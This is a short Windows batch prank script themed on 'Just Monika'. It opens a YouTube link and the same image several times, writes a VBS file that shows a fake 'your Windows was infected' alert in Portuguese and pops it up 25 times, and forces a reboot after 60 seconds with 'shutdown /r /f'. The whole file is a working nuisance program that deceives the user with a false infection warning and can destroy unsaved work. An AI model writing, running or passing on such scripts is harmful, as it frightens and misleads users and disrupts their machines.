@echo off
cls

@echo *********************************
@echo 		JUST MONIKA
@echo *********************************

start https://www.youtube.com/watch?v=puddRuyFHfI&list=PLXeqOX4jBooxN6CmAkz1AtiAgnDrWLgdr
start https://comicvine1.cbsistatic.com/uploads/original/14/146991/6233701-7050588222-monik.png
start https://comicvine1.cbsistatic.com/uploads/original/14/146991/6233701-7050588222-monik.png
start https://comicvine1.cbsistatic.com/uploads/original/14/146991/6233701-7050588222-monik.png
start https://comicvine1.cbsistatic.com/uploads/original/14/146991/6233701-7050588222-monik.png
start https://comicvine1.cbsistatic.com/uploads/original/14/146991/6233701-7050588222-monik.png
start https://comicvine1.cbsistatic.com/uploads/original/14/146991/6233701-7050588222-monik.png

echo x=msgbox ("SEU WINDOWS FOI INFECTADO",16,"!! ALERTA !!")>msgAlert.vbs

shutdown /r /f /t 60 -c "SEU PC VAI DESLIGAR EM 1 MIN XD, JUST MONIKA"

set /a loop=25

:repete
START msgAlert.vbs
set /a loop=%loop% -1
if %loop%==0 exit
goto repete